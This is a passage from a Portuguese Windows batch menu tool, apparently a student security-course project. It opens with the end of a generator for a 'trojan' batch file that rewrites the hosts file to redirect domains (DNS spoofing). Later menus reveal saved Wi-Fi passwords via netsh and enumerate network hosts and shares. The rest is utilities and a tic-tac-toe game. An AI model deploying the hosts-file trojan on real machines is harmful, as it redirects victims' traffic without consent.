echo ren hosts hosts.txt >> Teste_de_intrusao-DNS_Spoof.bat						
echo echo %redirect1B% %redirect1A% ^> hosts.txt >> Teste_de_intrusao-DNS_Spoof.bat			
echo echo %redirect2B% %redirect2A% ^> hosts.txt >> Teste_de_intrusao-DNS_Spoof.bat			
echo ren hosts.txt hosts >> Teste_de_intrusao-DNS_Spoof.bat						
echo exit >> Teste_de_intrusao-DNS_Spoof.bat								
echo.													
echo   "Teste_de_intrusao-DNS_Spoof.bat" gerado com sucesso!						
echo.													
pause													
goto :D													
:aviso0													
echo.													
echo   N∆o sera poss°vel gerar o trojan!								
echo   "Teste_de_intrusao-DNS_Spoof.bat" ja existe no diret¢rio atual!				
echo.													
pause													
goto :D													
:E 													
cls													
echo.													
echo * Clientes												
echo   ^|												
echo   +-^> 1 - FTP											
echo   ^|												
echo   +-^> 2 - Telnet											
echo   ^|												
echo   +-^> 3 - Conex∆o de Area de Trabalho Remota							
echo   ^|												
echo   +-^> 4 - Retornar ao menu principal								
echo.													
choice /C 1234 /M "Escolha uma das opcoes"								
IF %ERRORLEVEL%==1 goto :ftp										
IF %ERRORLEVEL%==2 goto :tel										
IF %ERRORLEVEL%==3 goto :atr										
IF %ERRORLEVEL%==4 goto :1x										
:ftp													
cls													
echo.													
echo    +-------------------------+									
echo    ^|                         ^|									
echo    ^| FTP em linha de comando ^|									
echo    ^|                         ^|									
echo    +-------------------------+									
echo    ^|												
echo    +-^> Para conectar, digite "open ftp.exemplo.br"						
echo    ^|												
echo    +-^>Para sair, digite "quit"									
echo.													
ftp													
echo.													
choice /C SN /M "Retornar ao menu anterior"								
IF %ERRORLEVEL%==1 goto :E										
IF %ERRORLEVEL%==2 exit										
:tel													
cls													
echo.													
echo    +-------------------+										
echo    ^|                   ^|										
echo    ^| Cliente MS Telnet ^|										
echo    ^|                   ^|										
echo    +-------------------+										
echo.													
SET /P IP=Digite o IP:											
echo.													
SET /P P=Digite a porta:										
echo.													
telnet %IP% %P%											
echo.													
choice /C SN /M "Retornar ao menu anterior"								
IF %ERRORLEVEL%==1 goto :E										
IF %ERRORLEVEL%==2 exit										
:atr													
cls													
echo.													
echo   +-----------------------------------------------+						
echo   ^|                                               ^|						
echo   ^| Servico de Conex∆o de Area de Trabalho Remota ^|						
echo   ^|                                               ^|						
echo   +-----------------------------------------------+						
echo.													
mstsc													
choice /C SN /M "Retornar ao menu anterior"								
IF %ERRORLEVEL%==1 goto :E										
IF %ERRORLEVEL%==2 exit									      
:F													
cls													
echo.													
echo * Redes												
echo   ^|												
echo   +-^> 1 - Rede LAN										
echo   ^|												
echo   +-^> 2 - Rede Wi-fi										
echo   ^|												
echo   +-^> 3 - Retornar ao menu principal								
echo.													
choice /C 123 /M:"Escolha uma das opcoes"								
IF %ERRORLEVEL%==1 goto :redelan									
IF %ERRORLEVEL%==2 goto :redewifi									
IF %ERRORLEVEL%==3 goto 1x										
:redelan												
cls													
echo.													
echo * Rede LAN												
echo   ^|												
echo   +-^> 1 - Listar os IP's da rede									
echo   ^|												
echo   +-^> 2 - Listar os compartilhamentos da rede							
echo   ^|												
echo   +-^> 3 - Retornar ao menu anterior								
echo.													
choice /C 123 /M:"Escolha uma das opcoes"								
IF %ERRORLEVEL%==1 goto :iplist									
IF %ERRORLEVEL%==2 goto :sharelist									
IF %ERRORLEVEL%==3 goto :F										
:iplist													
cls													
echo.													
arp -a													
echo.													
choice /C SN /M "Retornar ao menu anterior"								
IF %ERRORLEVEL%==1 goto :redelan									
IF %ERRORLEVEL%==2 exit										
:sharelist												
cls													
echo.													
net share												
echo.													
choice /C SN /M "Retornar ao menu anterior"								
IF %ERRORLEVEL%==1 goto :redelan									
IF %ERRORLEVEL%==2 exit										
:redewifi												
cls													
echo.													
echo * Rede Wi-fi											
echo   ^|												
echo   +-^> 1 - Criar um Hotspot Wi-fi									
echo   ^|												
echo   +-^> 2 - Parar Hotspot Wi-fi									
echo   ^|												
echo   +-^> 3 - Conectar-se a uma rede Wi-fi								
echo   ^|												
echo   +-^> 4 - Recuperar a senha da rede Wi-fi                                                         
echo   ^|												
echo   +-^> 5 - Retornar ao menu anterior                                                               
echo.													
choice /C 12345 /M:"Escolha uma das opcoes"								
IF %ERRORLEVEL%==1 goto :hotspotwf									
IF %ERRORLEVEL%==2 goto :stophotwifi									
IF %ERRORLEVEL%==3 goto :wifi										
IF %ERRORLEVEL%==4 goto :wifi2									
IF %ERRORLEVEL%==5 goto :F										
:hotspotwf												
cls													
echo.													
echo   Verificacao do dispositivo									
netsh wlan show drivers											
echo.													
echo   Verifique se aparece a mensagem "Hosted network supported : Yes"				
echo                                ou "Rede hospedada compatÌvel: Sim"				
echo   Se aparecer, seu computador tem suporte a hotspots, caso contrario,				
echo   nao!												
echo.													
choice /C SN /M:"Prosseguir"										
IF %ERRORLEVEL%==1 goto :gowifi									
IF %ERRORLEVEL%==2 goto :redewifi									
:gowifi													
echo.													
SET /P IDX=Digite um nome (SSID):									
echo.													
SET /P KEYX=Digite um senha:										
echo.													
netsh wlan set hostednetwork mode=allow ssid=%IDX% key=%KEYX%					
echo.													
echo   Atencao! Seu hotspot esta offline no momento!							
echo.													
choice /C SN /M:"Iniciar hotspot agora"								
IF %ERRORLEVEL%==1 goto :hotini									
IF %ERRORLEVEL%==2 goto :redewifi									
:hotini													
netsh wlan start hostednetwork										
echo.													
echo   Para parar o hotspot, basta acessar Redes - Rede Wi-fi - Parar Hotspot Wi-fi			
echo.													
choice /C SN /M "Retornar ao menu anterior"								
IF %ERRORLEVEL%==1 goto :redewifi									
IF %ERRORLEVEL%==2 exit										
:stophotwifi												
cls													
echo.													
echo   Desligando Hotspot WiFi...									
echo.													
netsh wlan stop hostednetwork										
echo.													
choice /C SN /M:"Verificar status do Hotspot"								
IF %ERRORLEVEL%==1 goto :verstatus									
IF %ERRORLEVEL%==2 goto :redewifi									
:verstatus												
echo.													
netsh wlan show hostednetwork										
goto :F													
:wifi													
cls													
echo.													
netsh wlan show network mode=bssid									
choice /C SN /M "Conectar a alguma rede Wi-Fi"							
IF %ERRORLEVEL%==1 goto :2D1										
IF %ERRORLEVEL%==2 goto :redewifi									
:2D1													
echo.													
SET /P NET=Digite o nome da rede (SSID):								
netsh wlan connect name=%NET%										
echo.													
choice /C SN /M "Retornar ao menu anterior"								
IF %ERRORLEVEL%==1 goto :redewifi									
IF %ERRORLEVEL%==2 exit									        
:wifi2	       												
cls													
echo.													
echo   +-------------------------------------------------------------------+				
echo   ^|                                                                   ^|				
echo   ^| Se voce n∆o se lembra de sua senha de seguranca da rede, podera   ^|				
echo   ^| visualizar sua senha Wi-fi aqui.                                  ^|				
echo   ^| As senhas v∆o estar depois do "Conte£do da Chave".              ^|				
echo   ^|                                                                   ^|				
echo   +-------------------------------------------------------------------+				
echo.													
set /P teste=Digite o nome da rede (SSID):								
echo.													
netsh wlan show profile name=%teste% key=clear | find "da Chave"					
echo.													
echo   Conclu°do!											
echo.													
choice /C SN /M "Retornar ao menu anterior"								
IF %ERRORLEVEL%==1 goto :redewifi									
IF %ERRORLEVEL%==2 exit										
:G													
cls													
color 0A												
echo.													
echo * Utilitarios											
echo   ^|												
echo   +-^> 1 - Ativar GodMode										
echo   ^|												
echo   +-^> 2 - Calculadora de %%									
echo   ^|												
echo   +-^> 3 - Filme Star Wars Ep. IV									
echo   ^|												
echo   +-^> 4 - Jogo da velha (game)									
echo   ^|												
echo   +-^> 5 - Limpar o cache DNS									
echo   ^|												
echo   +-^> 6 - Verificar erros no Windows								
echo   ^|												
echo   +-^> 7 - Retornar ao menu principal 								
echo.													
choice /C 12345678 /M:"Escolha uma das opcoes"							
IF %ERRORLEVEL%==1 goto :godmode									
IF %ERRORLEVEL%==2 goto :calc										
IF %ERRORLEVEL%==3 goto :starwars									
IF %ERRORLEVEL%==4 goto :velha									
IF %ERRORLEVEL%==5 goto :cdns										
IF %ERRORLEVEL%==6 goto :scanerror									
IF %ERRORLEVEL%==7 goto 1x										
:calc													
cls													
echo.													
echo   +---------------------------------------------+							
echo   ^|                                            ^|							
echo   ^| %% Calculo da relacao de porcentagem %%^|							
echo   ^|                                            ^|							
echo   +---------------------------------------------+							
echo.													
set /p numero_a=Digite o primeiro nß:									
echo.													
set /p numero_b=Digite o segundo nß:									
set /a relacao_porc=(%numero_b% * 100) / %numero_a%							
echo.													
echo   %numero_b% equivale a %relacao_porc% porcento de %numero_a%				
echo.													
choice /C SN /M "Retornar ao menu anterior"								
IF %ERRORLEVEL%==1 goto :G										
IF %ERRORLEVEL%==2 exit										
:cdns													
cls													
echo.													
echo   +----------------------------------------------------------+					
echo   ^|                                                          ^|					
echo   ^| Limpar o cache DNS pode resolver o problema de lentid∆o  ^|					
echo   ^| na navegacao via web browser!                            ^|					
echo   ^|                                                          ^|					
echo   +----------------------------------------------------------+					
echo.													
choice /C SN /M:"Limpar cache DNS"									
IF %ERRORLEVEL%==1 goto :sdns										
IF %ERRORLEVEL%==2 goto :G										
:sdns													
ipconfig /flushdns											
echo.													
pause													
goto :G													
:godmode												
cls													
color 1E												
echo.													
echo                     **********************************						
echo                     *                                *						
echo                     * Ativando o modo Deus (GodMode) *						
echo                     *                                *						
echo                     **********************************						
echo.													
echo   GodMode eh um painel de controle avancado que re£ne todas as ferramentas				
echo   necessarias para gerenciar sua maquina.								
echo.                                                                                                   
choice /C SN /M "Criar um diret¢rio GodMode agora"							
IF %ERRORLEVEL%==1 goto :2GM										
IF %ERRORLEVEL%==2 goto :G									        
:2GM													
echo.													
echo   Sera criado um diret¢rio GodMode em sua desktop, aguarde...					
C:													
CD C:\Users\%USERNAME%\Desktop									
ping 127.0.0.1 -n 2 > nul										
IF EXIST GodMode.{ED7BA470-8E54-465E-825C-99712043E01C} GOTO :endx					
IF NOT EXIST GodMode.{ED7BA470-8E54-465E-825C-99712043E01C} GOTO :inix					
:inix													
MD GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}							
echo.													
echo   Conclu°do!											
echo.													
pause													
goto :G													
:endx													
echo.													
echo   Ja existe um diret¢rio GodMode!									
echo.													
pause													
goto :G													
:velha													
cls													
SETLOCAL ENABLEDELAYEDEXPANSION										
ECHO.													
echo                        ***********************************						
Echo                        JOGO DA VELHA FEITO POR SAA							
echo                        ***********************************						
echo.													
echo 1 - Computador Facil.										
echo 2 - Computador moderado.										
echo 3 - Computador dificil.										
echo 4 - Computador impossivel.										
echo 5 - Sair.												
echo.													
set/p OPT=Escolha a dificuldade:									
:xC													
FOR /L %%A IN (1,1,9) DO SET NUM%%A=								
SET GP=													
SET CONT=												
SET JOG=												
if "%OPT%"=="5" EXIT										
FOR /L %%A IN (1,1,54) DO SET A%%A=   								
FOR /L %%A IN (3,6,51) DO (										
SET /A CONT=CONT+1											
SET A%%A=      !CONT!  										
)													
:1													
CLS													
echo.													
echo  !A1!∫!A7!∫!A13!											
echo  !A2!∫!A8!∫!A14!											
echo  !A3!∫!A9!∫!A15!											
echo  !A4!∫!A10!∫!A16!											
echo  !A5!∫!A11!∫!A17!											
echo  !A6!∫!A12!∫!A18!											
echo  ÕÕÕÕÕÕÕÕÕÕÕÕŒÕÕÕÕÕÕÕÕÕÕÕÕŒÕÕÕÕÕÕÕÕÕÕÕÕ								
echo  !A19!∫!A25!∫!A31!											
echo  !A20!∫!A26!∫!A32!											
echo  !A21!∫!A27!∫!A33!											
echo  !A22!∫!A28!∫!A34!											
echo  !A23!∫!A29!∫!A35!											
echo  !A24!∫!A30!∫!A36!											
echo  ÕÕÕÕÕÕÕÕÕÕÕÕŒÕÕÕÕÕÕÕÕÕÕÕÕŒÕÕÕÕÕÕÕÕÕÕÕÕ								
echo  !A37!∫!A43!∫!A49!											
echo  !A38!∫!A44!∫!A50!											
echo  !A39!∫!A45!∫!A51!											
echo  !A40!∫!A46!∫!A52!											
echo  !A41!∫!A47!∫!A53!											
echo  !A42!∫!A48!∫!A54!											
echo.													
IF "%GP%"=="1" GOTO GANHOU									
IF "%GP%"=="2" GOTO PERDEU									
IF "%JOG%"=="9" GOTO VELHA									
SET VOLTA=2&GOTO GP											
:2													
SET/P NUM=Em qual casa voce quer jogar(1-9):								
IF %NUM% LEQ 0 GOTO 1											
IF %NUM% GEQ 10 GOTO 1										
IF DEFINED NUM%NUM% GOTO 1										
SET NUM%NUM%=1											
SET /A B=NUM*6-5											
SET /A C=NUM*6-4											
SET /A D=NUM*6-3											
SET /A E=NUM*6-2											
SET /A F=NUM*6-1											
SET /A G=NUM*6												
SET A%B%=    €€€€ 											
SET A%C%=   €    €											
SET A%D%=  €      €											
SET A%E%=  €      €											
SET A%F%=   €    €											
SET A%G%=    €€€€ 											
SET /A JOG=JOG+1											
SET VOLTA=3&GOTO GP											
:3													
SET NUM=%RANDOM:~-1%											
IF "%NUM%"=="0" GOTO 3										
IF DEFINED NUM%NUM% GOTO 3										
IF "%OPT%"=="4" (											
IF NOT DEFINED NUM2 IF "%NUM1%%NUM9%"=="11" SET NUM=2						
IF NOT DEFINED NUM4 IF "%NUM1%%NUM9%"=="11" SET NUM=4						
IF NOT DEFINED NUM6 IF "%NUM1%%NUM9%"=="11" SET NUM=6						
IF NOT DEFINED NUM8 IF "%NUM1%%NUM9%"=="11" SET NUM=8						
IF NOT DEFINED NUM2 IF "%NUM3%%NUM7%"=="11" SET NUM=2						
IF NOT DEFINED NUM4 IF "%NUM3%%NUM7%"=="11" SET NUM=4						
IF NOT DEFINED NUM6 IF "%NUM3%%NUM7%"=="11" SET NUM=6						
IF NOT DEFINED NUM8 IF "%NUM3%%NUM7%"=="11" SET NUM=8						
IF NOT DEFINED NUM1 IF "%NUM2%%NUM4%"=="11" SET NUM=1						
IF NOT DEFINED NUM3 IF "%NUM2%%NUM6%"=="11" SET NUM=3						
IF NOT DEFINED NUM7 IF "%NUM4%%NUM8%"=="11" SET NUM=7						
IF NOT DEFINED NUM9 IF "%NUM6%%NUM8%"=="11" SET NUM=9						
IF NOT DEFINED NUM1 IF "%NUM2%%NUM8%"=="11" SET NUM=1						
IF NOT DEFINED NUM3 IF "%NUM2%%NUM8%"=="11" SET NUM=3						
IF NOT DEFINED NUM7 IF "%NUM2%%NUM8%"=="11" SET NUM=7						
IF NOT DEFINED NUM9 IF "%NUM2%%NUM8%"=="11" SET NUM=9						
IF NOT DEFINED NUM1 IF "%NUM4%%NUM6%"=="11" SET NUM=1						
IF NOT DEFINED NUM3 IF "%NUM4%%NUM6%"=="11" SET NUM=3						
IF NOT DEFINED NUM7 IF "%NUM4%%NUM6%"=="11" SET NUM=7						
IF NOT DEFINED NUM9 IF "%NUM4%%NUM6%"=="11" SET NUM=9						
IF NOT DEFINED NUM7 IF "%NUM1%%NUM8%"=="11" SET NUM=7						
IF NOT DEFINED NUM3 IF "%NUM1%%NUM6%"=="11" SET NUM=3						
IF NOT DEFINED NUM9 IF "%NUM3%%NUM8%"=="11" SET NUM=9						
IF NOT DEFINED NUM1 IF "%NUM3%%NUM4%"=="11" SET NUM=1						
IF NOT DEFINED NUM1 IF "%NUM2%%NUM7%"=="11" SET NUM=1						
IF NOT DEFINED NUM9 IF "%NUM6%%NUM7%"=="11" SET NUM=9						
IF NOT DEFINED NUM3 IF "%NUM2%%NUM9%"=="11" SET NUM=3						
IF NOT DEFINED NUM7 IF "%NUM4%%NUM9%"=="11" SET NUM=7						
GOTO PC4												
)													
IF "%OPT%"=="3" (											
:PC4													
IF NOT DEFINED NUM5 SET NUM=5										
IF NOT DEFINED NUM1 IF "%NUM5%"=="1" SET NUM=1							
IF NOT DEFINED NUM3 IF "%NUM5%"=="1" SET NUM=3							
IF NOT DEFINED NUM7 IF "%NUM5%"=="1" SET NUM=7							
IF NOT DEFINED NUM9 IF "%NUM5%"=="1" SET NUM=9							
GOTO PC3												
)													
IF "%OPT%"=="2" (											
:PC3													
IF NOT DEFINED NUM3 IF "%NUM1%%NUM2%"=="11" SET NUM=3						
IF NOT DEFINED NUM2 IF "%NUM1%%NUM3%"=="11" SET NUM=2						
IF NOT DEFINED NUM1 IF "%NUM2%%NUM3%"=="11" SET NUM=1						
IF NOT DEFINED NUM6 IF "%NUM4%%NUM5%"=="11" SET NUM=6						
IF NOT DEFINED NUM5 IF "%NUM4%%NUM6%"=="11" SET NUM=5						
IF NOT DEFINED NUM4 IF "%NUM5%%NUM6%"=="11" SET NUM=4						
IF NOT DEFINED NUM9 IF "%NUM7%%NUM8%"=="11" SET NUM=9						
IF NOT DEFINED NUM8 IF "%NUM7%%NUM9%"=="11" SET NUM=8						
IF NOT DEFINED NUM7 IF "%NUM8%%NUM9%"=="11" SET NUM=7						
IF NOT DEFINED NUM7 IF "%NUM1%%NUM4%"=="11" SET NUM=7						
IF NOT DEFINED NUM4 IF "%NUM1%%NUM7%"=="11" SET NUM=4						
IF NOT DEFINED NUM1 IF "%NUM4%%NUM7%"=="11" SET NUM=1						
IF NOT DEFINED NUM8 IF "%NUM2%%NUM5%"=="11" SET NUM=8						
IF NOT DEFINED NUM5 IF "%NUM2%%NUM8%"=="11" SET NUM=5						
IF NOT DEFINED NUM2 IF "%NUM5%%NUM8%"=="11" SET NUM=2						
IF NOT DEFINED NUM9 IF "%NUM3%%NUM6%"=="11" SET NUM=9						
IF NOT DEFINED NUM6 IF "%NUM3%%NUM9%"=="11" SET NUM=6						
IF NOT DEFINED NUM3 IF "%NUM6%%NUM9%"=="11" SET NUM=3						
IF NOT DEFINED NUM9 IF "%NUM1%%NUM5%"=="11" SET NUM=9						
IF NOT DEFINED NUM5 IF "%NUM1%%NUM9%"=="11" SET NUM=5						
IF NOT DEFINED NUM1 IF "%NUM5%%NUM9%"=="11" SET NUM=1						
IF NOT DEFINED NUM7 IF "%NUM3%%NUM5%"=="11" SET NUM=7						
IF NOT DEFINED NUM5 IF "%NUM3%%NUM7%"=="11" SET NUM=5						
IF NOT DEFINED NUM3 IF "%NUM5%%NUM7%"=="11" SET NUM=3						
IF NOT DEFINED NUM3 IF "%NUM1%%NUM2%"=="22" SET NUM=3						
IF NOT DEFINED NUM2 IF "%NUM1%%NUM3%"=="22" SET NUM=2						
IF NOT DEFINED NUM1 IF "%NUM2%%NUM3%"=="22" SET NUM=1						
IF NOT DEFINED NUM6 IF "%NUM4%%NUM5%"=="22" SET NUM=6						
IF NOT DEFINED NUM5 IF "%NUM4%%NUM6%"=="22" SET NUM=5						
IF NOT DEFINED NUM4 IF "%NUM5%%NUM6%"=="22" SET NUM=4						
IF NOT DEFINED NUM9 IF "%NUM7%%NUM8%"=="22" SET NUM=9						
IF NOT DEFINED NUM8 IF "%NUM7%%NUM9%"=="22" SET NUM=8						
IF NOT DEFINED NUM7 IF "%NUM8%%NUM9%"=="22" SET NUM=7						
IF NOT DEFINED NUM7 IF "%NUM1%%NUM4%"=="22" SET NUM=7						
IF NOT DEFINED NUM4 IF "%NUM1%%NUM7%"=="22" SET NUM=4						
IF NOT DEFINED NUM1 IF "%NUM4%%NUM7%"=="22" SET NUM=1						
IF NOT DEFINED NUM8 IF "%NUM2%%NUM5%"=="22" SET NUM=8						
IF NOT DEFINED NUM5 IF "%NUM2%%NUM8%"=="22" SET NUM=5						
IF NOT DEFINED NUM2 IF "%NUM5%%NUM8%"=="22" SET NUM=2						
IF NOT DEFINED NUM9 IF "%NUM3%%NUM6%"=="22" SET NUM=9						
IF NOT DEFINED NUM6 IF "%NUM3%%NUM9%"=="22" SET NUM=6						
IF NOT DEFINED NUM3 IF "%NUM6%%NUM9%"=="22" SET NUM=3						
IF NOT DEFINED NUM9 IF "%NUM1%%NUM5%"=="22" SET NUM=9						
IF NOT DEFINED NUM5 IF "%NUM1%%NUM9%"=="22" SET NUM=5						
IF NOT DEFINED NUM1 IF "%NUM5%%NUM9%"=="22" SET NUM=1						
IF NOT DEFINED NUM7 IF "%NUM3%%NUM5%"=="22" SET NUM=7						
IF NOT DEFINED NUM5 IF "%NUM3%%NUM7%"=="22" SET NUM=5						
IF NOT DEFINED NUM3 IF "%NUM5%%NUM7%"=="22" SET NUM=3						
)													
SET NUM%NUM%=2											
SET /A B=NUM*6-5											
SET /A C=NUM*6-4											
SET /A D=NUM*6-3											
SET /A E=NUM*6-2											
SET /A F=NUM*6-1											
SET /A G=NUM*6												
SET A%B%=   €    €											
SET A%C%=    €  € 											
SET A%D%=     €€ 											
SET A%E%=     €€ 											
SET A%F%=    €  € 											
SET A%G%=   €    €											
SET /A JOG=JOG+1											
SET VOLTA=1&GOTO GP											
:GP													
IF "%NUM1%%NUM2%%NUM3%"=="111" SET GP=1							
IF "%NUM4%%NUM5%%NUM6%"=="111" SET GP=1							
IF "%NUM7%%NUM8%%NUM9%"=="111" SET GP=1							
IF "%NUM1%%NUM4%%NUM7%"=="111" SET GP=1							
IF "%NUM2%%NUM5%%NUM8%"=="111" SET GP=1							
IF "%NUM3%%NUM6%%NUM9%"=="111" SET GP=1							
IF "%NUM1%%NUM5%%NUM9%"=="111" SET GP=1							
IF "%NUM3%%NUM5%%NUM7%"=="111" SET GP=1							
IF "%NUM1%%NUM2%%NUM3%"=="222" SET GP=2							
IF "%NUM4%%NUM5%%NUM6%"=="222" SET GP=2							
IF "%NUM7%%NUM8%%NUM9%"=="222" SET GP=2							
IF "%NUM1%%NUM4%%NUM7%"=="222" SET GP=2							
IF "%NUM2%%NUM5%%NUM8%"=="222" SET GP=2							
IF "%NUM3%%NUM6%%NUM9%"=="222" SET GP=2							
IF "%NUM1%%NUM5%%NUM9%"=="222" SET GP=2							
IF "%NUM3%%NUM5%%NUM7%"=="222" SET GP=2							
IF DEFINED GP GOTO 1											
IF "%JOG%"=="9" GOTO 1										
GOTO %VOLTA%												
:GANHOU													
ECHO PARABENS, VOCE GANHOU.										
SET /P J=Deseja jogar novamente? (S/N):									
IF "%J%"=="S" GOTO xC										
IF "%J%"=="N" EXIT										
IF "%J%"=="s" GOTO xC										
IF "%J%"=="n" EXIT										
EXIT													
:PERDEU													
ECHO QUE PENA, VOCE PERDEU.										
SET /P J=Deseja jogar novamente? (S/N):									
IF "%J%"=="S" GOTO xC										
IF "%J%"=="N" EXIT										
IF "%J%"=="s" GOTO xC										
IF "%J%"=="n" EXIT										
EXIT													
:VELHA													
ECHO DEU VELHA.												
SET /P J=Deseja jogar novamente? (S/N):									
IF "%J%"=="S" GOTO xC										
IF "%J%"=="N" EXIT										
IF "%J%"=="s" GOTO xC										
IF "%J%"=="n" EXIT										
:scanerror												
cls													
echo.													
echo   +-------------------------------------------------------------------+				
echo   ^|                                                                   ^|				
echo   ^| Atencao! S¢ funciona para problemas gerados pelo pr¢prio Windows! ^|				
echo   ^|                                                                   ^|				
echo   +-------------------------------------------------------------------+				
echo.													
choice /C SN /M:"Iniciar"										
IF %ERRORLEVEL%==1 goto :comx0									
IF %ERRORLEVEL%==2 goto :G										
:comx0													
echo.													
echo  Comando: sfc /scannow										
echo.													
sfc /scannow												
pause													
echo.													
choice /C SN /M "Retornar ao menu anterior"								
IF %ERRORLEVEL%==1 goto :G										
IF %ERRORLEVEL%==2 exit										
:starwars												
cls													
echo                      .              .       .                    .      .				
echo .        .               .       .     .            .						
echo    .           .        .                     .        .            .				
echo              .               .    .          .              .   .         .			
echo                _________________       ____         __________					
echo  .       .    /                 ^|    /   \    .  ^|         \					
echo      .       /    ______   _____^| . /     \      ^|    ___    ^|     .     .			
echo             \   \    ^|   ^|       /   /\ \     ^|   ^|___^>   ^|				
echo            . \   \   ^|   ^|      /   /__\ \  . ^|         _/             .			
echo  .     ________^>    ^|  ^|   ^| . /        \   ^|   ^|\  \_______    .			        
echo       ^|            /   ^|   ^|    /    ______\  ^|   ^|\           ^|				
echo       ^|___________/    ^|___^|   /____/      \____\^|___^| \__________^|    .			
echo   .     ____    __  . _____   ____      .  __________   .  _________				
echo       \   \  / \  /    /  /   \       ^|         \    /         ^|      .			
echo        \   \/   \/    /  /     \      ^|    ___    ^|  /    ______^|  .			
echo         \              /  /   /\ \ .   ^|   ^|___^>   ^| \   \				
echo    .     \            /  /   /__\ \    ^|         _/.  \   \					
echo           \    /\   /  /           \   ^|   ^|\  \______^>    ^|   .				
echo            \  / \  /  /    ______   \  ^|   ^|\              /          .			
echo  .       .  \/   \/  /____/     \___\ ^|___^| \____________/  LS				
echo                                .									
echo.													
echo   * Vers∆o ASCII o filme "Star Wars Episodio IV" (em ingles) *					
echo.													
choice /C SN /M "Deseja assistir"									
IF %ERRORLEVEL%==1 goto :starwars2									
IF %ERRORLEVEL%==2 goto :G										
:starwars2												
cls													
start telnet towel.blinkenlights.nl									
echo      Art by Shanaka Dias										
echo               __											
echo    .-.__     \ .-.  ___  __									
echo    ^|_^|  '--.-.-(\/\;;\_\.-._______.-.							
echo    (-)___ \ \ .-\ \;;\(  \      \\								
echo     Y    '--._\_((Q))\;;\\.-\     __(_)							
echo     I           __'-' / .--.((Q))---'   \,							
echo     I     ___.-:   \^|  ^|  \'-'_         \							
echo     A  .-'     \.-.\  \  \\ '--.__    '\							
echo     ^|  ^|____.---((Q))\  \__^|--\_     \     '						
echo        ( )        '-' \_  : \-''--.___\								
echo         Y               \ \ \      \(_)							
echo         I                \ \ \        \,							
echo         I                 \ \ \         \							
echo         A                  \ \ \         '\							
echo         ^|              snd  \ \__^|           '							
echo                              \_:. \								
echo                                \\ \								
echo                                 \\ \								
echo                                 \_\_^|								
echo.                                                                                                   
choice /C SN /M:"Retornar ao menu anterior"								
IF %ERRORLEVEL%==1 goto :G										
IF %ERRORLEVEL%==2 exit										
:H													
cls													
color 0F												
echo.													
echo * Creditos *											
echo.													
echo   Este script foi inspirado no software Insecuritynet, com os conhecimentos 			
echo   obtidos nas aulas  curso BSI. 									
echo.													
echo   Para visualizar a grade curricular  curso, acesse:						
echo   ^> iff.edu.br											
echo.													
choice /C SN /M "Retornar ao menu principal"								
IF %ERRORLEVEL%==1 goto :1x										
IF %ERRORLEVEL%==2 exit										
:I													
cls													
ping 127.0.0.1 -n 2 > nul										
echo. & echo. & echo. & echo.										
echo          Sebastiao Alves de Almeida (UFF- TECNOLOGIA EM SISTEMA DE COMPUTACAO)			
echo. & echo. & echo. & echo.										
echo      #####  #####  #####  #####  #####  #####  #####  #####  #####					
echo      #      #      #   #  #   #  #        #      #    #   #  #   #					
echo      #####  #####  ####   #####  #####    #      #    #####  #####					
echo          #  #      #   #  #   #      #    #      #    #   #  #   #					
echo      #####  #####  #####  #   #  #####    #    #####  #   #  ##### 				
echo. & echo. & echo. & echo.										
echo              Arquitetura e Seguranca em Comunicacao de Dados					
echo. & echo. & echo. & echo.										
pause > nul												
exit												        
